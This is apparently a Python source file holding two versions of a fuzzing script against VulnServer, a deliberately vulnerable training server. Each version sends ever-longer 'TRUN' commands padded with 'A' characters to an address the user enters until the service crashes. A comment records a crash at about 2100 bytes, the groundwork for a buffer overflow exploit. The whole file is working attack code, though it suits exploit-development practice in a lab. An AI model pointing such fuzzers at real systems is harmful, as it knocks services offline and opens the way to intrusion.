#!/usr/bin/python3
#around 2100 in linegth, the application crashes

#!/usr/bin/python3

#!/usr/bin/python3 

import sys,socket
import time

print("*****VulnServer*****")
ip_address=input("Enter the IP address:\n")
port=input("Enter the port number:\n")


if (len(ip_address)==0) or (len(port)==0):
    if (len(ip_address)>0) and (len(port)==0):
        print("*"*40)
        print("Port number field is empty")
    elif (len(ip_address)==0) and (len(port)>0):
        print("*"*40)
        print("IP address field is empty")
    elif (len(ip_address)==0) and (len(port)==0):
        print("*"*40)
        print("IP address field is empty")
        print("Port number field is empty")
    else:
        print("*"*40)
        print("Issues with the user input")

elif (len(ip_address)>0) and (len(port)>0):
    buffer=100
    while(buffer<10000):
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((ip_address,int(port)))
        print(f"Sending buffer --> {buffer}")
        s.send(b"TRUN /.:/ " + b"A" *buffer)
        s.close()
        buffer=buffer+200
        time.sleep(0.5)
--------------------------------------------------------------------------------------------------------------------------------------------------------------------
#!/usr/bin/python3

import sys,socket
import time


ip_address=input("Enter the IP address:\n")
port_number=input("Enter the port number:\n")


if len(ip_address)==0 or len(port_number)==0:
    if len(ip_address)>0 and len(port_number)==0:
        print("*"*50)
        print("Port number field is empty")
    elif len(ip_address)==0 and len(port_number)>0:
        print("*"*50)
        print("IP address field is empty")
    elif len(ip_address)==0 and len(port_number)==0:
        print("*"*50)
        print("IP address field is empty")
        print("Port number field is empty")
    else:
        print("*"*50)
        print("Issues with the user input")
elif len(ip_address)>0 and len(port_number)>0:
    if not port_number.isdigit():
        print("*"*50)
        print("Port number field must accept only numeric digits")
    else:
        buffer_size=100
        while int(buffer_size)<10000:
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect((ip_address,int(port_number)))
            print(f"Sending buffer length--> {buffer_size}")
            s.send(b"TRUN /.:/ " + b"A"*buffer_size)
            s.close()
            buffer_size=int(buffer_size)+200
            time.sleep(1)
